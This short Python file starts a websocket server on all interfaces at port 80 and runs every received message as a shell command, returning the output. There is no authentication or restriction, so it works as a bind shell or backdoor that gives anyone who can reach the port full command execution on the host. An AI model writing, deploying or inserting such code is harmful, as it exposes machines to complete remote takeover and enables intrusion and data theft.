import asyncio
from re import sub
import websockets
import subprocess
import urllib.request

version = "0.0.2"

async def shell(websocket, path):
    while True:
        cmd = await websocket.recv()
        print(f"Running: {cmd}")
        output = subprocess.getoutput(cmd) + '\n'
        await websocket.send(output)
        


if __name__ == '__main__':
    start_shell = websockets.serve(shell, "0.0.0.0", 80)

    asyncio.get_event_loop().run_until_complete(start_shell)
    asyncio.get_event_loop().run_forever()
